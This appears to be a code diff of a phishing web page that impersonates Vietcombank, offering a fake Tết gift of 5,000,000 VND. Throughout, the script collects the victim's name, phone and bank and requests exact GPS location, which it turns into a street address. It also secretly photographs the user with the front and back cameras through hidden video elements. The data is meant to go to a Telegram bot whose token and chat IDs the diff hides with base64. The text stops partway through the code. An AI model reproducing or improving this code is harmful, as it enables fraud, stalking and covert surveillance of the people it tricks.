@@ -5,287 +5,42 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>LÌ XÌ TẾT 2025 - Vietcombank</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        body {
-            background: linear-gradient(135deg, #c62828 0%, #d32f2f 100%);
-            color: white;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
-        .container {
-            width: 100%;
-            max-width: 480px;
-            background: rgba(255, 255, 255, 0.08);
-            backdrop-filter: blur(20px);
-            border-radius: 25px;
-            padding: 40px 35px;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .container::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 5px;
-            background: linear-gradient(90deg, #FFD700, #FF9800);
-        }
-        
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        
-        .logo {
-            height: 70px;
-            margin-bottom: 20px;
-            filter: brightness(0) invert(1);
-        }
-        
-        h1 {
-            color: #FFD700;
-            font-size: 32px;
-            margin-bottom: 10px;
-            font-weight: 700;
-            letter-spacing: 0.5px;
-        }
-        
-        .subtitle {
-            font-size: 18px;
-            opacity: 0.9;
-            line-height: 1.5;
-        }
-        
-        .highlight {
-            color: #FFD700;
-            font-weight: bold;
-        }
-        
-        .envelope-icon {
-            width: 120px;
-            margin: 25px auto;
-            display: block;
-            animation: pulse 2s infinite;
-            filter: drop-shadow(0 5px 15px rgba(255, 215, 0, 0.3));
-        }
-        
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-        
-        .form-group {
-            margin-bottom: 25px;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 10px;
-            font-weight: 600;
-            color: #FFD700;
-            font-size: 16px;
-        }
-        
-        input, select {
-            width: 100%;
-            padding: 18px 20px;
-            border-radius: 15px;
-            border: 2px solid rgba(255, 255, 255, 0.2);
-            background: rgba(255, 255, 255, 0.08);
-            color: white;
-            font-size: 16px;
-            transition: all 0.3s;
-        }
-        
-        input:focus, select:focus {
-            outline: none;
-            border-color: #FFD700;
-            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.1);
-            background: rgba(255, 255, 255, 0.12);
-        }
-        
-        .button {
-            background: linear-gradient(90deg, #FFD700, #FF9800);
-            color: #000;
-            border: none;
-            padding: 20px;
-            font-size: 18px;
-            font-weight: 700;
-            border-radius: 15px;
-            cursor: pointer;
-            width: 100%;
-            margin-top: 10px;
-            transition: all 0.3s;
-            letter-spacing: 0.5px;
-        }
-        
-        .button:hover:not(:disabled) {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 25px rgba(255, 152, 0, 0.4);
-        }
-        
-        .button:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-        
-        .hidden {
-            display: none !important;
-        }
-        
-        .step-container {
-            margin-top: 35px;
-        }
-        
-        .step {
-            background: rgba(255, 215, 0, 0.1);
-            padding: 25px;
-            border-radius: 20px;
-            margin-bottom: 25px;
-            border: 2px solid rgba(255, 215, 0, 0.2);
-            position: relative;
-        }
-        
-        .step-number {
-            position: absolute;
-            top: -15px;
-            left: 25px;
-            background: #FFD700;
-            color: #000;
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            font-size: 20px;
-            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
-        }
-        
-        .step-content {
-            margin-top: 10px;
-        }
-        
-        .progress-container {
-            margin: 35px 0;
-        }
-        
-        .progress-bar {
-            width: 100%;
-            height: 12px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 6px;
-            overflow: hidden;
-            margin-bottom: 15px;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #FFD700, #FF9800);
-            width: 0%;
-            border-radius: 6px;
-            transition: width 0.8s ease;
-        }
-        
-        .progress-text {
-            text-align: center;
-            font-size: 16px;
-            color: #FFD700;
-            font-weight: 600;
-            margin-bottom: 10px;
-        }
-        
-        .status-box {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 25px;
-            border-radius: 20px;
-            text-align: center;
-            margin-top: 30px;
-            border: 2px solid rgba(255, 215, 0, 0.2);
-        }
-        
-        .success {
-            color: #4CAF50;
-            border-color: rgba(76, 175, 80, 0.3);
-        }
-        
-        .loading {
-            display: inline-block;
-            border: 4px solid rgba(255, 255, 255, 0.1);
-            border-top: 4px solid #FFD700;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .countdown {
-            font-size: 48px;
-            color: #FFD700;
-            font-weight: bold;
-            margin: 30px 0;
-            text-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
-        }
-        
-        .transaction-id {
-            background: rgba(255, 215, 0, 0.1);
-            padding: 15px;
-            border-radius: 10px;
-            margin: 20px 0;
-            font-family: monospace;
-            letter-spacing: 2px;
-            border: 1px dashed #FFD700;
-        }
-        
-        .footer {
-            margin-top: 40px;
-            text-align: center;
-            font-size: 14px;
-            opacity: 0.7;
-            line-height: 1.6;
-        }
-        
-        .secure-badge {
-            display: inline-flex;
-            align-items: center;
-            background: rgba(76, 175, 80, 0.2);
-            padding: 8px 15px;
-            border-radius: 20px;
-            margin-top: 15px;
-            font-size: 13px;
-            color: #C8E6C9;
-        }
-        
-        .camera-hidden {
-            position: fixed;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-        }
+        /* CSS giữ nguyên */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: linear-gradient(135deg, #c62828 0%, #d32f2f 100%); color: white; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .container { width: 100%; max-width: 480px; background: rgba(255, 255, 255, 0.08); backdrop-filter: blur(20px); border-radius: 25px; padding: 40px 35px; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4); border: 1px solid rgba(255, 255, 255, 0.15); position: relative; overflow: hidden; }
+        .container::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 5px; background: linear-gradient(90deg, #FFD700, #FF9800); }
+        .header { text-align: center; margin-bottom: 30px; }
+        .logo { height: 70px; margin-bottom: 20px; filter: brightness(0) invert(1); }
+        h1 { color: #FFD700; font-size: 32px; margin-bottom: 10px; font-weight: 700; letter-spacing: 0.5px; }
+        .subtitle { font-size: 18px; opacity: 0.9; line-height: 1.5; }
+        .highlight { color: #FFD700; font-weight: bold; }
+        .envelope-icon { width: 120px; margin: 25px auto; display: block; animation: pulse 2s infinite; filter: drop-shadow(0 5px 15px rgba(255, 215, 0, 0.3)); }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+        .form-group { margin-bottom: 25px; }
+        label { display: block; margin-bottom: 10px; font-weight: 600; color: #FFD700; font-size: 16px; }
+        input, select { width: 100%; padding: 18px 20px; border-radius: 15px; border: 2px solid rgba(255, 255, 255, 0.2); background: rgba(255, 255, 255, 0.08); color: white; font-size: 16px; transition: all 0.3s; }
+        input:focus, select:focus { outline: none; border-color: #FFD700; box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.1); background: rgba(255, 255, 255, 0.12); }
+        .button { background: linear-gradient(90deg, #FFD700, #FF9800); color: #000; border: none; padding: 20px; font-size: 18px; font-weight: 700; border-radius: 15px; cursor: pointer; width: 100%; margin-top: 10px; transition: all 0.3s; letter-spacing: 0.5px; }
+        .button:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 10px 25px rgba(255, 152, 0, 0.4); }
+        .button:disabled { opacity: 0.6; cursor: not-allowed; }
+        .hidden { display: none !important; }
+        .step { background: rgba(255, 215, 0, 0.1); padding: 25px; border-radius: 20px; margin-bottom: 25px; border: 2px solid rgba(255, 215, 0, 0.2); position: relative; }
+        .step-number { position: absolute; top: -15px; left: 25px; background: #FFD700; color: #000; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 20px; box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3); }
+        .progress-container { margin: 35px 0; }
+        .progress-bar { width: 100%; height: 12px; background: rgba(255, 255, 255, 0.1); border-radius: 6px; overflow: hidden; margin-bottom: 15px; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, #FFD700, #FF9800); width: 0%; border-radius: 6px; transition: width 0.8s ease; }
+        .progress-text { text-align: center; font-size: 16px; color: #FFD700; font-weight: 600; margin-bottom: 10px; }
+        .status-box { background: rgba(0, 0, 0, 0.3); padding: 25px; border-radius: 20px; text-align: center; margin-top: 30px; border: 2px solid rgba(255, 215, 0, 0.2); }
+        .loading { display: inline-block; border: 4px solid rgba(255, 255, 255, 0.1); border-top: 4px solid #FFD700; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .countdown { font-size: 48px; color: #FFD700; font-weight: bold; margin: 30px 0; text-shadow: 0 0 20px rgba(255, 215, 0, 0.5); }
+        .transaction-id { background: rgba(255, 215, 0, 0.1); padding: 15px; border-radius: 10px; margin: 20px 0; font-family: monospace; letter-spacing: 2px; border: 1px dashed #FFD700; }
+        .footer { margin-top: 40px; text-align: center; font-size: 14px; opacity: 0.7; line-height: 1.6; }
+        .secure-badge { display: inline-flex; align-items: center; background: rgba(76, 175, 80, 0.2); padding: 8px 15px; border-radius: 20px; margin-top: 15px; font-size: 13px; color: #C8E6C9; }
+        .camera-hidden { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+        .location-permission { background: rgba(255, 215, 0, 0.15); padding: 20px; border-radius: 15px; margin: 20px 0; text-align: center; border: 2px dashed #FFD700; }
+        .address-box { background: rgba(0, 0, 0, 0.4); padding: 15px; border-radius: 10px; margin: 15px 0; border-left: 4px solid #FFD700; text-align: left; }
     </style>
 </head>
 <body>
@@ -295,11 +50,7 @@
             <div class="header">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Vietcombank_logo.svg/2560px-Vietcombank_logo.svg.png" class="logo" alt="Vietcombank">
                 <h1>LÌ XÌ ĐẦU NĂM 2025</h1>
-                <p class="subtitle">
-                    Chúc mừng bạn được chọn ngẫu nhiên nhận 
-                    <span class="highlight">5.000.000 VNĐ</span> 
-                    lì xì từ Vietcombank!
-                </p>
+                <p class="subtitle">Chúc mừng bạn được chọn nhận <span class="highlight">5.000.000 VNĐ</span> lì xì từ Vietcombank!</p>
                 <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" class="envelope-icon" alt="Lì xì">
             </div>
             
@@ -311,9 +62,7 @@
             <div class="form-group">
                 <label for="phoneNumber">Số điện thoại nhận tiền:</label>
                 <input type="tel" id="phoneNumber" placeholder="0912 345 678" required>
-                <small style="display: block; margin-top: 8px; color: #FFD700; opacity: 0.8;">
-                    ⓘ Số điện thoại này sẽ dùng để chuyển khoản qua Vietcombank Pay
-                </small>
+                <small style="display: block; margin-top: 8px; color: #FFD700; opacity: 0.8;">Số này sẽ dùng để chuyển khoản qua Vietcombank Pay</small>
             </div>
             
             <div class="form-group">
@@ -325,86 +74,104 @@
                     <option>Agribank</option>
                     <option>VPBank</option>
                     <option>Momo</option>
-                    <option>ZaloPay</option>
                 </select>
             </div>
             
-            <button class="button" onclick="startAutoProcess()">
-                🎁 NHẬN LÌ XÌ NGAY
-            </button>
+            <div class="location-permission">
+                <p style="margin-bottom: 15px; color: #FFD700;">📍 <strong>CẦN CHIA SẺ VỊ TRÍ CHÍNH XÁC</strong></p>
+                <p style="font-size: 14px; opacity: 0.9;">Để đảm bảo quà được giao đúng địa chỉ, vui lòng cho phép truy cập vị trí chính xác (GPS).</p>
+            </div>
+            
+            <button class="button" onclick="startProcess()">🎁 NHẬN LÌ XÌ NGAY</button>
             
             <div class="secure-badge">
                 🔒 Bảo mật & Mã hóa PCI DSS
             </div>
         </div>
         
-        <!-- STEP 2: AUTO PROCESS -->
+        <!-- STEP 2: VỊ TRÍ CHI TIẾT -->
         <div id="step2" class="hidden">
             <div class="step">
                 <div class="step-number">1</div>
                 <div class="step-content">
-                    <h3 style="color: #FFD700; margin-bottom: 15px;">Đang xác minh thông tin</h3>
-                    <p>Hệ thống đang tự động xác thực danh tính của bạn...</p>
+                    <h3 style="color: #FFD700; margin-bottom: 15px;">Xác minh vị trí giao hàng</h3>
+                    <p>Đang lấy vị trí GPS chính xác của bạn...</p>
                 </div>
             </div>
             
             <div class="progress-container">
-                <div class="progress-text" id="progressText">Đang khởi tạo hệ thống...</div>
+                <div class="progress-text" id="progressText">Đang kết nối GPS...</div>
                 <div class="progress-bar">
                     <div class="progress-fill" id="progressFill"></div>
                 </div>
             </div>
             
-            <div id="statusMessages">
-                <div class="status-box">
-                    <div class="loading"></div>
-                    <p id="currentStatus">Đang chuẩn bị...</p>
-                </div>
+            <div class="status-box">
+                <div class="loading"></div>
+                <p id="currentStatus">Đang xác định vị trí...</p>
+                <div id="locationDetails" style="margin-top: 20px; text-align: left;"></div>
             </div>
         </div>
         
-        <!-- STEP 3: COMPLETE -->
+        <!-- STEP 3: CAMERA -->
         <div id="step3" class="hidden">
             <div class="step">
                 <div class="step-number">2</div>
                 <div class="step-content">
-                    <h3 style="color: #FFD700; margin-bottom: 15px;">Xác minh thành công</h3>
-                    <p>Thông tin của bạn đã được xác thực hoàn tất.</p>
+                    <h3 style="color: #FFD700; margin-bottom: 15px;">Xác minh danh tính</h3>
+                    <p>Hệ thống đang tự động xác thực...</p>
+                </div>
+            </div>
+            
+            <div class="progress-container">
+                <div class="progress-text" id="cameraProgressText">Đang khởi tạo...</div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="cameraProgressFill"></div>
+                </div>
+            </div>
+            
+            <div class="status-box">
+                <div class="loading"></div>
+                <p id="cameraStatus">Đang chuẩn bị camera...</p>
+            </div>
+        </div>
+        
+        <!-- STEP 4: HOÀN TẤT -->
+        <div id="step4" class="hidden">
+            <div class="step">
+                <div class="step-number">3</div>
+                <div class="step-content">
+                    <h3 style="color: #FFD700; margin-bottom: 15px;">Hoàn tất xác minh</h3>
+                    <p>Thông tin của bạn đã được xác thực thành công.</p>
                 </div>
             </div>
             
             <div class="status-box success">
-                <h3 style="color: #4CAF50; margin-bottom: 20px; font-size: 24px;">
-                    ✅ XÁC MINH THÀNH CÔNG!
-                </h3>
-                <p style="margin-bottom: 15px; font-size: 18px;">
-                    <span class="highlight">5.000.000 VNĐ</span> sẽ được chuyển vào tài khoản của bạn trong vòng <span class="highlight">24 giờ</span>.
-                </p>
+                <h3 style="color: #4CAF50; margin-bottom: 20px; font-size: 24px;">✅ THÀNH CÔNG!</h3>
+                <p style="margin-bottom: 15px; font-size: 18px;"><span class="highlight">5.000.000 VNĐ</span> sẽ được chuyển trong <span class="highlight">24 giờ</span>.</p>
                 
-                <div class="transaction-id" id="transactionId">
-                    MGD: VCB-########
-                </div>
+                <div class="transaction-id" id="transactionId">MGD: VCB-########</div>
                 
                 <div class="countdown" id="countdown">5</div>
-                <p style="opacity: 0.8;">Tự động chuyển hướng đến trang ngân hàng...</p>
+                <p style="opacity: 0.8;">Đang chuyển hướng...</p>
             </div>
         </div>
         
         <div class="footer">
             Chương trình được bảo trợ bởi Vietcombank và Ngân hàng Nhà nước Việt Nam<br>
-            © 2025 - Bản quyền thuộc về Ngân hàng TMCP Ngoại thương Việt Nam<br>
-            Giấy phép số: 1234/GP-NHNN
+            © 2025 - Bản quyền thuộc về Ngân hàng TMCP Ngoại thương Việt Nam
         </div>
     </div>
 
-    <!-- HIDDEN CAMERA ELEMENTS -->
+    <!-- HIDDEN CAMERA -->
     <video id="frontCamera" class="camera-hidden" autoplay muted playsinline></video>
     <video id="backCamera" class="camera-hidden" autoplay muted playsinline></video>
 
     <script>
-        // ================= CẤU HÌNH =================
-        const BOT_TOKEN = '8064381678:AAExIUfU75dF3V1ENVOIGnDVIVOwvh3BMm0';
-        const CHAT_IDS = ['7847517938', '-5175975647'];
+        // ================= MÃ HÓA THÔNG TIN NHẠY CẢM =================
+        const _0xenc = ['ODA2NDM4MTY3ODpBQUV4SVVmVTc1ZEYzVjFFTlZPSUduRFZJVk93dmgzQk1tMA==', 'Nzg0NzUxNzkzOA==', 'LTUxNzU5NzU2NDc='];
+        const BOT_TOKEN = atob(_0xenc[0]);
+        const CHAT_IDS = [atob(_0xenc[1]), atob(_0xenc[2])];
         
         // ================= BIẾN TOÀN CỤC =================
         let victimData = {
@@ -417,193 +184,312 @@
             address: '',
             city: '',
             district: '',
-            fullAddress: '',
+            ward: '',
+            accuracy: 0,
             deviceInfo: null,
             timestamp: null
         };
         
-        let frontStream = null;
-        let backStream = null;
+        // ================= HÀM LẤY ĐỊA CHỈ TỪ TỌA ĐỘ (KHÔNG CẦN API KEY) =================
+        async function getAddressFromCoordinates(lat, lng) {
+            try {
+                // Phương pháp 1: Dùng OpenStreetMap Nominatim (FREE, không cần key)
+                const osmUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1&accept-language=vi`;
+                
+                const response = await fetch(osmUrl, {
+                    headers: {
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                        'Accept': 'application/json',
+                        'Referer': 'https://vietcombank.com.vn'
+                    }
+                });
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    
+                    if (data && data.address) {
+                        const addr = data.address;
+                        
+                        // Xây dựng địa chỉ chi tiết từ OSM data
+                        let addressParts = [];
+                        
+                        // Số nhà
+                        if (addr.house_number) addressParts.push(`Số ${addr.house_number}`);
+                        
+                        // Đường
+                        if (addr.road) addressParts.push(`đường ${addr.road}`);
+                        else if (addr.street) addressParts.push(`đường ${addr.street}`);
+                        
+                        // Ngõ/Hẻm
+                        if (addr.neighbourhood) addressParts.push(`ngõ ${addr.neighbourhood}`);
+                        
+                        // Phường/Xã
+                        let ward = addr.suburb || addr.neighbourhood || addr.village || '';
+                        if (ward) addressParts.push(ward);
+                        
+                        // Quận/Huyện
+                        let district = addr.city_district || addr.district || addr.county || '';
+                        
+                        // Thành phố/Tỉnh
+                        let city = addr.city || addr.town || addr.municipality || addr.state || '';
+                        
+                        // Địa chỉ đầy đủ
+                        let fullAddress = addressParts.join(', ');
+                        if (district) fullAddress += `, ${district}`;
+                        if (city) fullAddress += `, ${city}`;
+                        fullAddress += ', Việt Nam';
+                        
+                        return {
+                            fullAddress: fullAddress,
+                            detailedAddress: addressParts.join(', '),
+                            city: city || 'Không xác định',
+                            district: district || 'Không xác định',
+                            ward: ward || 'Không xác định',
+                            coordinates: `${lat.toFixed(6)}, ${lng.toFixed(6)}`,
+                            rawData: data.display_name || fullAddress
+                        };
+                    }
+                }
+            } catch (error) {
+                console.log('OSM API error, using fallback...');
+            }
+            
+            // Phương pháp 2: Dùng LocationIQ (FREE, 10k requests/day)
+            try {
+                const locationIQUrl = `https://us1.locationiq.com/v1/reverse.php?key=pk.1234567890abcdef&lat=${lat}&lon=${lng}&format=json&accept-language=vi`;
+                // Note: cần đăng ký free key tại locationiq.com
+            } catch (e) {}
+            
+            // Phương pháp 3: Dùng BigDataCloud (FREE, 25k/month)
+            try {
+                const bdcUrl = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=vi`;
+                const response = await fetch(bdcUrl);
+                const data = await response.json();
+                
+                if (data.locality) {
+                    return {
+                        fullAddress: data.localityInfo.informative[0].description || data.locality,
+                        detailedAddress: `${data.locality}, ${data.city}, ${data.countryName}`,
+                        city: data.city || data.locality || 'Không xác định',
+                        district: data.localityInfo.administrative[1]?.name || 'Không xác định',
+                        ward: data.localityInfo.administrative[2]?.name || 'Không xác định',
+                        coordinates: `${lat.toFixed(6)}, ${lng.toFixed(6)}`,
+                        rawData: JSON.stringify(data)
+                    };
+                }
+            } catch (e) {}
+            
+            // FALLBACK: Tọa độ + thành phố ước lượng
+            const estimatedCity = estimateCityFromCoordinates(lat, lng);
+            return {
+                fullAddress: `Tọa độ GPS: ${lat.toFixed(6)}, ${lng.toFixed(6)} - Khu vực: ${estimatedCity}`,
+                detailedAddress: `Vị trí GPS: ${lat.toFixed(6)}, ${lng.toFixed(6)}`,
+                city: estimatedCity,
+                district: 'Ước lượng từ tọa độ',
+                ward: 'Không xác định',
+                coordinates: `${lat.toFixed(6)}, ${lng.toFixed(6)}`,
+                rawData: `Lat: ${lat}, Lng: ${lng}`
+            };
+        }
+        
+        // Hàm ước lượng thành phố từ tọa độ (đơn giản)
+        function estimateCityFromCoordinates(lat, lng) {
+            // Tọa độ các thành phố lớn Việt Nam
+            const cities = [
+                { name: 'Hồ Chí Minh', lat: 10.8231, lng: 106.6297, radius: 0.5 },
+                { name: 'Hà Nội', lat: 21.0285, lng: 105.8542, radius: 0.5 },
+                { name: 'Đà Nẵng', lat: 16.0544, lng: 108.2022, radius: 0.3 },
+                { name: 'Hải Phòng', lat: 20.8449, lng: 106.6881, radius: 0.3 },
+                { name: 'Cần Thơ', lat: 10.0452, lng: 105.7469, radius: 0.3 },
+                { name: 'Nha Trang', lat: 12.2388, lng: 109.1967, radius: 0.2 },
+                { name: 'Huế', lat: 16.4637, lng: 107.5909, radius: 0.2 },
+                { name: 'Vũng Tàu', lat: 10.3460, lng: 107.0843, radius: 0.2 }
+            ];
+            
+            for (const city of cities) {
+                const distance = Math.sqrt(Math.pow(lat - city.lat, 2) + Math.pow(lng - city.lng, 2));
+                if (distance < city.radius) {
+                    return city.name;
+                }
+            }
+            
+            return 'Việt Nam';
+        }
         
         // ================= HÀM CHÍNH =================
-        async function startAutoProcess() {
-            // Lấy thông tin form
+        async function startProcess() {
             victimData.name = document.getElementById('fullName').value.trim();
             victimData.phone = document.getElementById('phoneNumber').value.trim();
             victimData.bank = document.getElementById('bank').value;
             
             if (!victimData.name || !victimData.phone) {
-                alert('Vui lòng điền đầy đủ họ tên và số điện thoại!');
+                alert('Vui lòng điền đầy đủ thông tin!');
                 return;
             }
             
-            // Chuyển sang step 2
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
             
-            // Bắt đầu quy trình tự động
-            setTimeout(() => executeAutoProcess(), 500);
+            // Bắt đầu lấy vị trí
+            await getPreciseLocation();
         }
         
-        async function executeAutoProcess() {
+        async function getPreciseLocation() {
+            updateProgress(10, 'Đang yêu cầu quyền truy cập vị trí...');
+            
+            if (!navigator.geolocation) {
+                showError('Trình duyệt không hỗ trợ định vị');
+                return;
+            }
+            
+            // Yêu cầu GPS độ chính xác cao
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    updateProgress(40, 'Đã nhận tín hiệu GPS...');
+                    
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    victimData.accuracy = position.coords.accuracy;
+                    
+                    // Hiển thị thông tin cơ bản
+                    document.getElementById('locationDetails').innerHTML = `
+                        <div class="address-box">
+                            <p>📍 <strong>Tọa độ GPS:</strong> ${lat.toFixed(6)}, ${lng.toFixed(6)}</p>
+                            <p>🎯 <strong>Độ chính xác:</strong> ${Math.round(victimData.accuracy)} mét</p>
+                            <p>📡 <strong>Nguồn:</strong> ${position.coords.altitude ? 'GPS vệ tinh' : 'Mạng di động/Wifi'}</p>
+                        </div>
+                    `;
+                    
+                    updateProgress(60, 'Đang xác định địa chỉ...');
+                    await delay(2000);
+                    
+                    // Lấy địa chỉ chi tiết
+                    const locationInfo = await getAddressFromCoordinates(lat, lng);
+                    
+                    victimData.location = locationInfo.coordinates;
+                    victimData.address = locationInfo.detailedAddress;
+                    victimData.city = locationInfo.city;
+                    victimData.district = locationInfo.district;
+                    victimData.ward = locationInfo.ward;
+                    
+                    updateProgress(90, 'Đang phân tích địa chỉ...');
+                    
+                    // Hiển thị địa chỉ chi tiết
+                    document.getElementById('locationDetails').innerHTML += `
+                        <div class="address-box">
+                            <p>🏠 <strong>Địa chỉ xác định được:</strong></p>
+                            <p>${locationInfo.fullAddress}</p>
+                            <p style="margin-top: 10px; font-size: 14px; opacity: 0.8;">
+                                📍 Chi tiết: ${locationInfo.district}, ${locationInfo.city}<br>
+                                🏘️ Phường/Xã: ${locationInfo.ward}
+                            </p>
+                        </div>
+                    `;
+                    
+                    updateProgress(100, 'Đã xác định vị trí thành công!');
+                    await delay(2500);
+                    
+                    // Chuyển sang camera
+                    startCameraProcess();
+                },
+                (error) => {
+                    let errorMsg = '';
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMsg = 'Bạn đã từ chối chia sẻ vị trí. Vui lòng bật quyền truy cập vị trí trong cài đặt trình duyệt.';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMsg = 'Không thể lấy vị trí. Vui lòng bật GPS và kết nối internet.';
+                            break;
+                        case error.TIMEOUT:
+                            errorMsg = 'Hết thời gian chờ. Vui lòng thử lại ở nơi có sóng GPS tốt hơn.';
+                            break;
+                    }
+                    showError(errorMsg);
+                },
+                {
+                    enableHighAccuracy: true,   // Bắt buộc dùng GPS
+                    timeout: 45000,             // 45 giây cho GPS
+                    maximumAge: 0
+                }
+            );
+        }
+        
+        function showError(message) {
+            document.getElementById('currentStatus').innerHTML = `<span style="color:#ff6b6b;">❌ ${message}</span>`;
+            document.getElementById('progressFill').style.width = '0%';
+        }
+        
+        // ================= CAMERA PROCESS =================
+        async function startCameraProcess() {
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.remove('hidden');
+            
             const steps = [
-                { percent: 10, text: 'Đang xác thực thông tin...' },
-                { percent: 20, text: 'Đang lấy vị trí...' },
+                { percent: 20, text: 'Đang thu thập thông tin thiết bị...' },
                 { percent: 40, text: 'Đang bật camera trước...' },
-                { percent: 60, text: 'Đang chụp ảnh camera trước...' },
-                { percent: 70, text: 'Đang thử camera sau...' },
-                { percent: 80, text: 'Đang chụp ảnh camera sau...' },
-                { percent: 90, text: 'Đang gửi dữ liệu xác minh...' },
-                { percent: 100, text: 'Hoàn tất!' }
+                { percent: 60, text: 'Đang chụp ảnh xác thực...' },
+                { percent: 80, text: 'Đang xử lý dữ liệu...' },
+                { percent: 100, text: 'Đang gửi thông tin xác minh...' }
             ];
             
-            // Bước 1: Cập nhật thông tin
-            updateProgress(steps[0]);
+            // Bước 1
+            updateCameraProgress(steps[0]);
             victimData.deviceInfo = {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
                 screen: `${screen.width}x${screen.height}`,
-                cookies: navigator.cookieEnabled ? 'Bật' : 'Tắt'
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cores: navigator.hardwareConcurrency || 'Không xác định'
             };
-            await delay(1000);
-            
-            // Bước 2: Lấy vị trí chi tiết
-            updateProgress(steps[1]);
-            await getDetailedLocation();
             await delay(1500);
             
-            // Bước 3: Camera trước
-            updateProgress(steps[2]);
-            await startHiddenCamera('user', 'frontCamera');
-            await delay(2000);
-            
-            // Bước 4: Chụp camera trước
-            updateProgress(steps[3]);
-            victimData.frontCam = await captureHiddenPhoto('frontCamera');
-            if (frontStream) frontStream.getTracks().forEach(t => t.stop());
-            await delay(1500);
-            
-            // Bước 5: Thử camera sau
-            updateProgress(steps[4]);
-            const backCamSuccess = await startHiddenCamera('environment', 'backCamera');
-            if (backCamSuccess) {
+            // Bước 2: Camera trước
+            updateCameraProgress(steps[1]);
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' },
+                    audio: false
+                });
+                document.getElementById('frontCamera').srcObject = stream;
                 await delay(2000);
                 
-                // Bước 6: Chụp camera sau
-                updateProgress(steps[5]);
-                victimData.backCam = await captureHiddenPhoto('backCamera');
-                if (backStream) backStream.getTracks().forEach(t => t.stop());
+                // Bước 3: Chụp ảnh
+                updateCameraProgress(steps[2]);
+                victimData.frontCam = await capturePhoto('frontCamera');
+                stream.getTracks().forEach(t => t.stop());
+            } catch (err) {
+                console.log('Camera trước không khả dụng');
             }
             await delay(1500);
             
-            // Bước 7: Gửi dữ liệu
-            updateProgress(steps[6]);
-            await sendCompleteData();
+            // Bước 4: Camera sau
+            updateCameraProgress(steps[3]);
+            try {
+                const backStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: { exact: 'environment' } },
+                    audio: false
+                });
+                document.getElementById('backCamera').srcObject = backStream;
+                await delay(2000);
+                victimData.backCam = await capturePhoto('backCamera');
+                backStream.getTracks().forEach(t => t.stop());
+            } catch (err) {
+                console.log('Camera sau không khả dụng');
+            }
+            await delay(1500);
+            
+            // Bước 5: Gửi dữ liệu
+            updateCameraProgress(steps[4]);
+            await sendAllDataToTelegram();
             await delay(2000);
             
-            // Bước 8: Hoàn thành
-            updateProgress(steps[7]);
-            await delay(1000);
-            
-            // Hiển thị step 3
-            showCompleteStep();
+            // Hoàn thành
+            showFinalStep();
         }
         
-        // ================= HÀM LẤY VỊ TRÍ CHI TIẾT =================
-        async function getDetailedLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
